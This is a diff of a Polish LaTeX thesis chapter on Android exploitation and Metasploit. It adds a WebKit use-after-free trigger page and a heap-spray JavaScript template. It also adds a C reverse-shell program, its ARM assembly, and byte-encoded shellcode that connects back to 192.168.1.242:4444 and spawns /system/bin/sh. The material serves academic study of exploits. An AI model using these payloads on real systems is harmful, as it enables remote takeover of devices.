@@ -644,7 +644,7 @@ W przykładzie z poprzedniego punktu został zaprezentowany jeden ze sposobów n
 Uruchomienie programu z odpowiednio spreparowanym argumentem pozwoliło wywołać dowolną procedurę programu. Zazwyczaj jest to jednak niewystarczające, 
 aby atakujący mógł osiągnąć zamierzone cele. W punkcie tym zostanie zaprezentowany atak, w trakcie którego przekazywany jest kod maszynowy zgodny 
 z architekturą procesora danego urządzenia. Takie fragmenty kodu maszynowego nazywane są \textit{shellcode'em}. Tworzenie tego typu wstawek zostanie 
-omówione w rozdziale \ref{chapter:shellcode}. Aby przekazany kod został wykonany przez program, potrzebne jest odpowiednie ustawienie wartości
+omówione w rozdziale \ref{section:shellcode}. Aby przekazany kod został wykonany przez program, potrzebne jest odpowiednie ustawienie wartości
 licznika instrukcji na adres pamięci, w którym umieszczony jest \textit{shellcode}. Sposób, w jaki zostanie to zrobione, jest zależny od błędu 
 w programie. Poniżej zostanie przedstawione wstrzyknięcie kodu z wykorzystaniem nadpisania adresu powrotu z podprogramu, co zostało opisane w poprzednim
 punkcie. Można jednak także wykorzystać w tym celu dowolny inny błąd w programie. 
@@ -915,19 +915,283 @@ niezależny od pozycji i z tego powodu nie podlegał randomizacji. Zostało to n
 % https://blog.duosecurity.com/2012/07/exploit-mitigations-in-android-jelly-bean-4-1/
 % https://www.kernel.org/doc/Documentation/sysctl/kernel.txt (randomize-va-space)
 
-\chapter{Tworzenie shellcode'u}\label{chapter:shellcode}
-
 
 \chapter{Przykłady ataków i ich implementacja w narzędziu Metasploit}
+
+\section{Framework Metasploit}
+
+\section{Błąd typu \textit{use-after-free} w bibliotece Webkit}
+
+\iffalse
+% szablon wydruku
+\begin{print}
+\begin{verbatim}
+\end{verbatim}
+\caption{}
+\label{print:}
+\end{print}
+\fi
+
+\begin{print}
+\begin{verbatim}
+<html>
+    <head>
+        <script language="JavaScript">
+            function heap() {
+                var id = document.getElementById("target");
+                var attribute = id.getAttributeNode('id');
+                nodes = attribute.childNodes;
+                document.body.removeChild(id);
+                attribute.removeChild(nodes[0]);
+                setTimeout(function () {
+                    alert("freeze");
+                    nodes[0].textContent
+                }, 0);
+            }
+        </script>
+    </head>
+    <body onload=heap()>
+        <p id=target></p>
+    </body>
+</html>
+\end{verbatim}
+\caption{Treść strony HTML, która powoduje wystąpienie błędu}
+\label{print:use-after-free-html}
+\end{print}
+
+\begin{print}
+\begin{verbatim}
+setTimeout(function () {
+    for (var i = 0; i < 70000; i++) {
+        var s = new String(unescape("\u0058\u0058"));
+    };
+
+    var scode = unescape("\u0060\u0060");
+    var nops = unescape("#{encoded_nops}");
+    var shell = unescape("#{encoded_shellcode}");
+    do {
+        scode += scode;
+        nops += nops;
+    } while (scode.length <= 0x1000);
+    nops += shell
+    target = new Array();
+    for (i = 0; i < 300; i++) {
+        if (i < 130) target[i] = scode;
+        if (i > 130) target[i] = nops;
+
+        document.write(target[i]);
+        document.write("<br />");
+        if (i > 250) {
+            alert("freeze");
+            nodes[0].textContent
+        }
+    }
+}, 0);
+\end{verbatim}
+\caption{Wypełnienie stery wartościami, które umożliwiają wykonanie dostarczonego kodu}
+\label{print:heap-spray}
+\end{print}
+
+
+\begin{figure}
+\centering
+\begin{tikzpicture}[x=2cm, y=-1em, node distance=0mm ]
+\tikzstyle{blank}=[text centered, anchor=north west, minimum height=1em, minimum width=2cm]
+\tikzstyle{block}=[draw, minimum height=1em, text centered, rounded corners, anchor=north west]
+\tikzstyle{XLblock}=[block, minimum width=8cm, minimum height=2em]
+\tikzstyle{Lblock}=[block, minimum width=6cm]
+\tikzstyle{Mblock}=[block, minimum width=4cm]
+\tikzstyle{Sblock}=[block, minimum width=2cm]
+
+\node[XLblock] at (0,0) [fill=blue!20] {\LARGE NOP + shellcode};
+\node[blank] at (4,0) {0x00680000};
+\node[XLblock] at (0,2) [fill=blue!20] {\LARGE NOP + shellcode};
+\node[blank] at (4,4) {0x00600060};
+\node[XLblock] (nop) at (0,4) [fill=blue!20] {\LARGE NOP + shellcode};
+\node[XLblock] at (0,6) [fill=yellow!20] {\LARGE 0x00600060};
+\node[blank] at (4,8) {0x00580058};
+\node[XLblock] (jump) at (0,8) [fill=yellow!20] {\LARGE 0x00600060};
+\node[Sblock] at (1,10) [fill=red!20] {};
+\node[XLblock] at (0,11) [fill=yellow!20] {\LARGE 0x00600060};
+\node[Sblock] at (3,13) [fill=red!20] {};
+\node[Sblock] at (1,14) [fill=green!20] {\tiny 0x00580058};
+\node[Sblock] at (2,14) [fill=green!20] {\tiny 0x00580058};
+\node[Sblock] at (2,15) [fill=red!20] {};
+\node[Sblock] at (0,16) [fill=red!20] {};
+\node[Sblock] at (1,16) [fill=green!20] {\tiny 0x00580058};
+\node[Sblock] at (0,17) [fill=green!20] {\tiny 0x00580058};
+\node[Sblock] at (3,17) [fill=green!20] {\tiny 0x00580058};
+\node[Sblock] at (2,18) [fill=red!20] {};
+\node[Sblock] at (3,18) [fill=red!20] {};
+\node[Sblock] (start) at (0,19) [fill=olive!33] {\tiny 0x00580058};
+\node[Sblock] at (1,19) [fill=red!20] {};
+\node[Sblock] at (2,20) [fill=red!20] {};
+\node[Sblock] at (0,21) [fill=red!20] {};
+\node[Sblock] at (2,21) [fill=green!20] {\tiny 0x00580058};
+\node[Sblock] at (3,21) [fill=green!20] {\tiny 0x00580058};
+\node[Sblock] at (1,22) [fill=red!20] {};
+\node[Sblock] at (3,22) [fill=red!20] {};
+\node[blank] at (4,22) {0x0000a000};
+\draw (start.north west) edge[->, thick, bend left=60] (jump.west);
+\draw (jump.west) edge[->, thick, bend left=60] (nop.west);
+\end{tikzpicture}
+\caption{Sterta}
+\label{figure:use-after-free-heap}
+\end{figure}
+
+
+\section{Tworzenie shellcode'u}\label{section:shellcode}
+
+\begin{print}
+\begin{verbatim}
+void connect_back(struct sockaddr_in *server) {
+  int sock = socket(PF_INET, SOCK_STREAM, 0);
+  connect(sock, (struct sockaddr *) server, sizeof server) ;
+  dup2(sock, STDERR_FILENO);
+  dup2(sock, STDOUT_FILENO);
+  dup2(sock, STDIN_FILENO);
+  char *args[] = { "/system/bin/sh", NULL};
+  execve(args[0], args, NULL);
+}
+
+int main(int argc, char *argv[]) {
+  struct hostent *hp = gethostbyname(argv[1]);
+  struct sockaddr_in server;
+  memcpy((char *) &server.sin_addr, (char *) hp->h_addr, hp->h_length);
+  server.sin_port = htons(atoi(argv[2]));
+  server.sin_family = AF_INET;
+  connect_back(&server);
+}
+\end{verbatim}
+\caption{Program, na podstawie którego powstaje shellcode}
+\label{print:reverse_tcp_c}
+\end{print}
+
+\begin{print}
+\begin{verbatim}
+ 1:	push	{r0, r1, r2, r4, r5, lr}
+ 2:	adds	r5, r0, #0
+ 3:	movs	r1, #1
+ 4:	movs	r2, #0
+ 5:	movs	r0, #2
+ 6:	blx	0x84ac         ; adres procedury socket
+ 7:	movs	r2, #16
+ 8:	adds	r4, r0, #0
+ 9:	adds	r1, r5, #0
+10:	blx	0x84b8         ; adres procedury connect
+11:	adds	r0, r4, #0
+12:	movs	r1, #0
+13:	blx	0x84c4         ; adres procedury dup2
+14:	adds	r0, r4, #0
+15:	movs	r1, #1
+16:	blx	0x84c4         ; adres procedury dup2
+17:	adds	r0, r4, #0
+18:	movs	r1, #2
+19:	blx	0x84c4         ; adres procedury dup2
+20:	ldr	r0, [pc, #16]
+21:	movs	r2, #0
+22:	mov	r1, sp
+23:	add	r0, pc
+24:	str	r0, [sp, #0]
+25:	str	r2, [sp, #4]
+26:	blx	0x84d0          ; adres procedury execve
+27:	pop	{r0, r1, r2, r4, r5, pc}
+\end{verbatim}
+\caption{Kod assemblera procedury connect\_back}
+\label{print:connect_back_asm}
+\end{print}
+
+
+\begin{print}
+\begin{verbatim}
+ 1: // socket(PF_INET, SOCK_STREAM, 0);
+ 2: "\x01\x21"          // 	mov	r1, #1
+ 3: "\x00\x22"          // 	mov	r2, #0
+ 4: "\x02\x20"          // 	mov	r0, #2
+ 5: "\xff\x27"          // 	mov	r7, #255
+ 6: "\x1a\x37"          // 	add	r7, #26
+ 7: "\x00\xdf"          // 	svc	0
+ 8:
+ 9: // connect(sock, sockaddr, 16);
+10: "\x04\x1c"          // 	add	r4, r0, #0
+11: "\x10\x22"          // 	mov	r2, #16
+12: "\x09\xa1"          // 	add	r1, pc, #36  ; adres linii 42
+13: "\xff\x27"          // 	mov	r7, #255
+14: "\x1c\x37"          // 	add	r7, #28
+15: "\x00\xdf"          // 	svc	0
+16:
+17: // dup2(sock, stdin);
+18: "\x3f\x27"          // 	mov	r7, #63
+19: "\x20\x1c"          // 	add	r0, r4, #0
+20: "\x00\x21"          // 	mov	r1, #0
+21: "\x00\xdf"          // 	svc	0
+22:
+23: // dup2(sock, stdout);
+24: "\x20\x1c"          // 	add	r0, r4, #0
+25: "\x01\x21"          // 	mov	r1, #1
+26: "\x00\xdf"          // 	svc	0
+27:
+28: // dup2(sock, stderr);
+29: "\x20\x1c"          // 	add	r0, r4, #0
+30: "\x02\x21"          // 	mov	r1, #2
+31: "\x00\xdf"          // 	svc	0
+32:
+33: // execve("/system/bin/sh", args, env)
+34: "\x04\xa1"          // 	add	r1, pc, #16   ; adres linii 45
+35: "\x52\x40"          // 	eor	r2, r2
+36: "\x05\xa0"          // 	add	r0, pc, #20   ; adres linii 47
+37: "\x08\x60"          // 	str	r0, [r1, #0]
+38: "\x0b\x27"          // 	mov	r7, #11
+39: "\x00\xdf"          // 	svc	0
+40:
+41: // dane
+42: "\x02\x00"          //  .hword	2	// sin_fam: 2
+43: "\x11\x5c"          //  .hword	0x5c11	// port: 4444
+44: "\xc0\xa8\x01\xf2"  //  .byte	192, 168, 1, 242	// ip: 192.168.1.242
+45: "\0\0\0\0"          //  .word	0	// args[0]
+46: "\0\0\0\0"          //  .word	0	// args[1]
+47: "/system/bin/sh\0"
+\end{verbatim}
+\caption{shellcode nawiązujący połączenie zwrotne}
+\label{print:reverse_tcp_asm}
+\end{print}
+
+
+Numery przerwać systemowych można znaleźć w pliku \verb+/usr/include/asm/unistd.h+. Ponieżej zostały wypisane definicje potrzebnych .., tj. 
+\verb+socket+, \verb+connect+, \verb+dup2+, \verb+execve+
+
+\begin{verbatim}
+#define __NR_SYSCALL_BASE 0
+#define __NR_execve (__NR_SYSCALL_BASE+ 11)
+#define __NR_dup2 (__NR_SYSCALL_BASE+ 63)
+#define __NR_socket (__NR_SYSCALL_BASE+281)
+#define __NR_connect (__NR_SYSCALL_BASE+283)
+\end{verbatim}
+
+
+\begin{verbatim}
+struct sockaddr_in {
+    short            sin_family;   // e.g. AF_INET
+    unsigned short   sin_port;     // e.g. htons(3490)
+    struct in_addr   sin_addr;     // see struct in_addr, below
+    char             sin_zero[8];  // zero this if you want to
+};
+
+struct in_addr {
+    unsigned long s_addr;  // load with inet_aton()
+};
+\end{verbatim}
 
 % ogolnie opisać matesploita, 
 % materiały: 
 %  praca dla samsunga
 %  msf_user_guide.pdf
 
-\section{CVE-2010-1119}
 
-\section{CVE-2010-1807}
+% http://d.hatena.ne.jp/kaito834/20110508/1304846053
+% http://www.slideshare.net/mjza/bsides
+
+
 
 \chapter{Podsumowanie}
 
